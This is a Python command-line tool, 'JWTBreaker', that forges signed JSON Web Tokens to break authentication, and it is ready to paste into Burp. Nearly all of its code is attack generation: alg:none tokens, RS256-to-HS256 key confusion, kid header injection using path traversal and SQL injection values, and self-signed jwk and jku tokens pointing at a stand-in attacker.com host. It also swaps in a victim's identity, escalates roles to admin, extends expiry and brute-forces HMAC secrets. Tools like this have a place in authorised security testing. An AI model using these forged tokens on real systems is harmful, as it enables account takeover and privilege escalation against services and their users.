#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════╗
║   JWTBreaker CLI - Real JWT Attack Generator  ║
║   Generates VALID, SIGNED tokens, not just    ║
║   structure. Ready to paste into Burp.        ║
╚══════════════════════════════════════════════╝

Usage:
  python jwtbreaker.py --token "eyJ...xxx.yyy.zzz"
  python jwtbreaker.py --token "..." --attack alg_none
  python jwtbreaker.py --token "..." --secret "mysecret123"
  python jwtbreaker.py --token "..." --pubkey public.pem --attack rs_to_hs
  python jwtbreaker.py --token "..." --attack jwk_embed
  python jwtbreaker.py --token "..." --crack wordlist.txt
  python jwtbreaker.py --token "..." --victim victim@target.com --admin admin
  python jwtbreaker.py --token "..." --json
"""

import sys
import json
import base64
import hmac
import hashlib
import argparse
import time

# ── Colors ───────────────────────────────────────────────────
R  = "\033[91m"
Y  = "\033[93m"
G  = "\033[92m"
C  = "\033[96m"
W  = "\033[97m"
DIM = "\033[2m"
B  = "\033[1m"
RST = "\033[0m"


# ── Base64url helpers ────────────────────────────────────────
def b64u_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64u_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def encode_json(obj: dict) -> str:
    return b64u_encode(json.dumps(obj, separators=(",", ":")).encode())


# ── JWT parsing ───────────────────────────────────────────────
def parse_jwt(token: str):
    parts = token.strip().split(".")
    if len(parts) < 2:
        raise ValueError("Invalid JWT format — expected header.payload.signature")
    try:
        header  = json.loads(b64u_decode(parts[0]))
        payload = json.loads(b64u_decode(parts[1]))
    except Exception as e:
        raise ValueError(f"Failed to decode JWT: {e}")
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


# ── Signing functions ────────────────────────────────────────
def sign_hs(header: dict, payload: dict, secret: str, alg="HS256") -> str:
    """HMAC sign — produces a fully VALID token if secret is correct."""
    h = dict(header)
    h["alg"] = alg
    msg = f"{encode_json(h)}.{encode_json(payload)}".encode()

    hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    hash_fn = hash_map.get(alg, hashlib.sha256)

    sig = hmac.new(secret.encode(), msg, hash_fn).digest()
    return f"{msg.decode()}.{b64u_encode(sig)}"


def sign_rs_with_private_key(header: dict, payload: dict, private_key_pem: str, alg="RS256") -> str:
    """RSA sign with a private key PEM."""
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding

    h = dict(header)
    h["alg"] = alg
    msg = f"{encode_json(h)}.{encode_json(payload)}".encode()

    key = serialization.load_pem_private_key(private_key_pem.encode(), password=None)
    hash_map = {"RS256": hashes.SHA256(), "RS384": hashes.SHA384(), "RS512": hashes.SHA512()}
    hash_alg = hash_map.get(alg, hashes.SHA256())

    sig = key.sign(msg, padding.PKCS1v15(), hash_alg)
    return f"{msg.decode()}.{b64u_encode(sig)}"


def generate_rsa_keypair():
    """Generate fresh RSA keypair for jwk-embed attacks."""
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    priv_pem = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    ).decode()

    pub_numbers = key.public_key().public_numbers()
    n = pub_numbers.n
    e = pub_numbers.e

    n_bytes = n.to_bytes((n.bit_length() + 7) // 8, "big")
    e_bytes = e.to_bytes((e.bit_length() + 7) // 8, "big")

    jwk = {
        "kty": "RSA",
        "n":   b64u_encode(n_bytes),
        "e":   b64u_encode(e_bytes),
        "use": "sig",
        "alg": "RS256",
        "kid": "attacker-key-1",
    }
    return key, priv_pem, jwk


def extract_pubkey_from_pem_or_cert(path: str) -> str:
    """Read a PEM public key / cert file, return raw text (for HS secret guessing)."""
    with open(path, "r") as f:
        return f.read()


# ── Attack generators ────────────────────────────────────────
def attack_alg_none(header, payload):
    results = []
    for alg in ["none", "None", "NONE", "nOnE"]:
        h = dict(header)
        h["alg"] = alg
        tok_empty = f"{encode_json(h)}.{encode_json(payload)}."
        tok_dot   = f"{encode_json(h)}.{encode_json(payload)}"
        results.append((f'alg="{alg}" (empty sig with trailing dot)', tok_empty))
        results.append((f'alg="{alg}" (no trailing dot)', tok_dot))
    return results


def attack_rs_to_hs(header, payload, pubkey_pem):
    """RS256 -> HS256 confusion: sign with the server's public key as HMAC secret."""
    results = []
    if not pubkey_pem:
        results.append((
            "[NEEDS --pubkey] RS256→HS256 confusion",
            "Run again with: --pubkey server_public.pem"
        ))
        return results

    # Try a few normalizations of the public key as HMAC secret
    variants = {
        "raw PEM (as-is, with trailing newline)": pubkey_pem,
        "raw PEM (no trailing newline)":          pubkey_pem.rstrip("\n"),
        "raw PEM (no trailing newline, \\n->\\\\n)": pubkey_pem.rstrip("\n").replace("\n", "\\n"),
    }
    for label, secret in variants.items():
        tok = sign_hs(header, payload, secret, alg="HS256")
        results.append((f"HS256 signed with {label}", tok))
    return results


def attack_kid_injection(header, payload, secret):
    """
    kid header injection — different kid payloads imply different secrets:
      - /dev/null path traversal → server reads empty file → secret = b""
      - SQL injection → server query returns attacker-controlled string
      - generic attacker key → uses --secret if you've planted that key server-side
    """
    results = []
    # (kid_value, forced_secret_or_None) — None mean use --secret if given
    kid_payloads = [
        ("../../../../../../dev/null", ""),   # ALWAYS empty — /dev/null is empty regardless of --secret
        ("/dev/null",                  ""),   # same
        ("' UNION SELECT 'forged_secret'-- -", "forged_secret"),  # SQLi: forces this exact secret
        ("../../../../../../etc/passwd", None),  # depends on file content, can't predict
    ]
    for kid_val, forced_secret in kid_payloads:
        h = dict(header)
        h["kid"] = kid_val
        h["alg"] = "HS256"

        if forced_secret is not None:
            actual_secret = forced_secret
            note = f'(signed with secret="{actual_secret}" — this is what /dev/null or SQLi forces)'
        elif secret:
            actual_secret = secret
            note = f'(signed with your --secret="{secret}")'
        else:
            # /etc/passwd content varies — give placeholder, can't sign meaningfully
            results.append((
                f'kid="{kid_val}" — NEEDS server\'s /etc/passwd content as secret',
                "(cannot pre-sign — read the file content first, then re-run with --secret)"
            ))
            continue

        tok = sign_hs(h, payload, actual_secret, alg="HS256")
        results.append((f'kid="{kid_val}" {note}', tok))
    return results


def attack_jwk_embed(header, payload):
    """Embed a freshly-generated RSA public key as 'jwk' in header, sign with matching private key."""
    key, priv_pem, jwk = generate_rsa_keypair()
    h = dict(header)
    h["alg"] = "RS256"
    h["jwk"] = jwk
    h.pop("kid", None)

    tok = sign_rs_with_private_key(h, payload, priv_pem, alg="RS256")
    return [
        ("jwk-embedded token (signed with freshly generated key)", tok),
    ], priv_pem


def attack_jku_x5u(header, payload, jku_url):
    """jku/x5u injection — produces unsigned structure + instructions to host JWKS."""
    key, priv_pem, jwk = generate_rsa_keypair()
    h = dict(header)
    h["alg"] = "RS256"
    h["jku"] = jku_url or "https://attacker.com/jwks.json"
    h.pop("kid", None)

    tok = sign_rs_with_private_key(h, payload, priv_pem, alg="RS256")
    jwks_doc = {"keys": [jwk]}
    return [
        (f"jku → {h['jku']} (signed, host this JWKS at that URL)", tok),
    ], priv_pem, jwks_doc


def attack_payload_manipulation(header, payload, secret, victim, admin_val):
    """Modify identity/role claims, optionally re-sign if secret known."""
    results = []
    sub_fields  = ["sub","email","user","userId","user_id","username","id","uid","account","login","identity"]
    role_fields = ["role","roles","group","groups","type","userType","isAdmin","admin","privilege","scope","permission"]

    for field in sub_fields:
        if field in payload:
            p = dict(payload)
            p[field] = victim
            if secret:
                tok = sign_hs(header, p, secret, alg=header.get("alg", "HS256"))
                results.append((f"{field} → {victim} (re-signed with secret)", tok))
            else:
                tok = f"{encode_json(header)}.{encode_json(p)}."
                results.append((f"{field} → {victim} (alg:none, no secret given)", tok))

    for field in role_fields:
        if field in payload:
            for newval, label in [(admin_val, admin_val), (True, "true")]:
                p = dict(payload)
                p[field] = newval
                if secret:
                    tok = sign_hs(header, p, secret, alg=header.get("alg", "HS256"))
                    results.append((f"{field} → {label} (re-signed with secret)", tok))
                else:
                    tok = f"{encode_json(header)}.{encode_json(p)}."
                    results.append((f"{field} → {label} (alg:none, no secret given)", tok))

    for f in ["isAdmin", "is_admin", "isStaff", "isSuperuser", "isModerator"]:
        if f in payload and payload[f] is not True:
            p = dict(payload)
            p[f] = True
            if secret:
                tok = sign_hs(header, p, secret, alg=header.get("alg", "HS256"))
                results.append((f"{f} → true (re-signed with secret)", tok))
            else:
                tok = f"{encode_json(header)}.{encode_json(p)}."
                results.append((f"{f} → true (alg:none, no secret given)", tok))

    return results


def attack_expiry(header, payload, secret):
    results = []
    alg = header.get("alg", "HS256")

    if "exp" in payload:
        p = dict(payload)
        p["exp"] = int(time.time()) + 86400 * 3650
        if secret:
            tok = sign_hs(header, p, secret, alg=alg)
            results.append(("exp → +10 years (re-signed)", tok))
        else:
            results.append(("exp → +10 years (alg:none)", f"{encode_json(header)}.{encode_json(p)}."))

        p2 = dict(payload)
        del p2["exp"]
        if secret:
            tok = sign_hs(header, p2, secret, alg=alg)
            results.append(("exp removed (re-signed)", tok))
        else:
            results.append(("exp removed (alg:none)", f"{encode_json(header)}.{encode_json(p2)}."))

    if "nbf" in payload:
        p = dict(payload)
        p["nbf"] = 0
        if secret:
            tok = sign_hs(header, p, secret, alg=alg)
            results.append(("nbf → 0 (re-signed)", tok))
        else:
            results.append(("nbf → 0 (alg:none)", f"{encode_json(header)}.{encode_json(p)}."))

    return results


def crack_hs_secret(header, payload, sig, wordlist_path):
    """Brute-force the HMAC secret using a wordlist (offline, no requests sent)."""
    alg = header.get("alg", "HS256")
    hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    hash_fn = hash_map.get(alg, hashlib.sha256)

    parts = [encode_json(header), encode_json(payload)]
    msg = ".".join(parts).encode()
    target_sig = b64u_decode(sig) if sig else None

    if not target_sig:
        return None, 0

    tried = 0
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                word = line.strip()
                if not word:
                    continue
                tried += 1
                test_sig = hmac.new(word.encode(), msg, hash_fn).digest()
                if hmac.compare_digest(test_sig, target_sig):
                    return word, tried
    except FileNotFoundError:
        return "ERR_NO_FILE", tried

    return None, tried


# ── Printing ──────────────────────────────────────────────────
def banner():
    print(f"""{C}{B}
   ╦╔═╗╦  ╦╔╦╗  ╔╗ ╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗
   ║║║║║║║ ║   ╠╩╗╠╦╝║╣ ╠═╣╠╩╗║╣ ╠╦╝
  ╚╝╚═╝╚╩╝ ╩   ╚═╝╩╚═╚═╝╩ ╩╩ ╩╚═╝╩╚═
{RST}{DIM}  JWT Attack Generator — produces real signed tokens{RST}
""")


def print_section(title, items, color=C):
    if not items:
        return
    print(f"\n  {color}{B}{'─'*60}{RST}")
    print(f"  {color}{B}{title}{RST}")
    print(f"  {color}{'─'*60}{RST}")
    for label, tok in items:
        print(f"\n    {DIM}{label}{RST}")
        print(f"    {W}{tok}{RST}")


def main():
    parser = argparse.ArgumentParser(
        description="JWTBreaker CLI — real signed JWT attack payloads",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument("--token", required=True, help="The JWT to attack")
    parser.add_argument("--attack", choices=[
        "alg_none", "rs_to_hs", "kid", "jwk_embed", "jku",
        "payload", "expiry", "all"
    ], default="all", help="Which attack category to run (default: all)")
    parser.add_argument("--secret", help="Known/guessed HMAC secret (enables re-signing)")
    parser.add_argument("--pubkey", help="Path to server's RSA public key PEM (for rs_to_hs)")
    parser.add_argument("--jku-url", help="URL for jku injection attack", default=None)
    parser.add_argument("--victim", default="victim@target.com", help="Victim identity to inject")
    parser.add_argument("--admin", default="admin", help="Admin role value to inject")
    parser.add_argument("--crack", help="Wordlist file to brute-force HS secret (offline)")
    parser.add_argument("--json", action="store_true", help="Output as JSON instead of pretty print")

    args = parser.parse_args()

    try:
        header, payload, sig = parse_jwt(args.token)
    except ValueError as e:
        print(f"{R}Error: {e}{RST}")
        sys.exit(1)

    if not args.json:
        banner()
        print(f"  {DIM}Header :{RST}  {W}{json.dumps(header)}{RST}")
        print(f"  {DIM}Payload:{RST}  {W}{json.dumps(payload)}{RST}\n")

    # ── Secret cracking mode ───────────────────────────────────
    if args.crack:
        if not args.json:
            print(f"  {Y}{B}Cracking HS secret with wordlist: {args.crack}{RST}")
        found, tried = crack_hs_secret(header, payload, sig, args.crack)
        if found == "ERR_NO_FILE":
            print(f"  {R}Error: wordlist file not found → {args.crack}{RST}")
            sys.exit(1)
        if found:
            print(f"  {G}{B}✓ SECRET FOUND: '{found}'{RST}  ({tried} tried)")
            print(f"  {DIM}Use --secret '{found}' to generate re-signed attack tokens{RST}")
        else:
            print(f"  {R}✗ Not found in wordlist ({tried} words tried){RST}")
        if args.attack == "all" and not found:
            sys.exit(0)
        if found and not args.secret:
            args.secret = found

    results = {}

    # ── alg:none ─────────────────────────────────────────────
    if args.attack in ("alg_none", "all"):
        items = attack_alg_none(header, payload)
        results["alg_none"] = items
        if not args.json:
            print_section("ALG:NONE ATTACK", items, R)

    # ── RS256 -> HS256 ───────────────────────────────────────
    if args.attack in ("rs_to_hs", "all"):
        pubkey_pem = None
        if args.pubkey:
            try:
                pubkey_pem = extract_pubkey_from_pem_or_cert(args.pubkey)
            except FileNotFoundError:
                if not args.json:
                    print(f"\n  {R}Error: pubkey file not found → {args.pubkey}{RST}")
        if header.get("alg", "").startswith("RS") or args.attack == "rs_to_hs":
            items = attack_rs_to_hs(header, payload, pubkey_pem)
            results["rs_to_hs"] = items
            if not args.json:
                print_section("RS256 → HS256 KEY CONFUSION", items, R)

    # ── kid injection ────────────────────────────────────────
    if args.attack in ("kid", "all"):
        if "kid" in header or args.attack == "kid":
            items = attack_kid_injection(header, payload, args.secret)
            results["kid"] = items
            if not args.json:
                print_section("KID HEADER INJECTION", items, Y)

    # ── jwk embed ────────────────────────────────────────────
    if args.attack in ("jwk_embed", "all"):
        items, priv_pem = attack_jwk_embed(header, payload)
        results["jwk_embed"] = items
        results["jwk_embed_private_key"] = priv_pem
        if not args.json:
            print_section("JWK HEADER EMBED (self-signed)", items, Y)
            print(f"\n    {DIM}Private key (keep for re-signing if needed):{RST}")
            print(f"    {DIM}{priv_pem.strip()}{RST}")

    # ── jku/x5u ───────────────────────────────────────────────
    if args.attack in ("jku", "all"):
        items, priv_pem, jwks_doc = attack_jku_x5u(header, payload, args.jku_url)
        results["jku"] = items
        results["jku_jwks_to_host"] = jwks_doc
        results["jku_private_key"] = priv_pem
        if not args.json:
            print_section("JKU INJECTION", items, Y)
            print(f"\n    {DIM}Host this JWKS document at the jku URL:{RST}")
            print(f"    {W}{json.dumps(jwks_doc)}{RST}")
            print(f"\n    {DIM}Quick host with Python:{RST}")
            print(f"    {DIM}echo '{json.dumps(jwks_doc)}' > jwks.json && python3 -m http.server 8000{RST}")

    # ── payload manipulation ──────────────────────────────────
    if args.attack in ("payload", "all"):
        items = attack_payload_manipulation(header, payload, args.secret, args.victim, args.admin)
        results["payload"] = items
        if not args.json:
            note = "" if args.secret else f"  {DIM}(pass --secret to get RE-SIGNED valid tokens){RST}"
            print_section(f"PAYLOAD MANIPULATION{note}", items, G)

    # ── expiry ────────────────────────────────────────────────
    if args.attack in ("expiry", "all"):
        items = attack_expiry(header, payload, args.secret)
        results["expiry"] = items
        if not args.json:
            print_section("EXPIRY MANIPULATION", items, G)

    if args.json:
        print(json.dumps(results, indent=2, default=str))
    else:
        print(f"\n  {C}{'='*60}{RST}")
        print(f"  {DIM}Tip: alg:none and jwk_embed/jku tokens are VALID as-is.{RST}")
        print(f"  {DIM}     payload/expiry/kid tokens need --secret to be valid.{RST}")
        print(f"  {DIM}     rs_to_hs needs --pubkey to attempt key confusion.{RST}\n")


if __name__ == "__main__":
    main()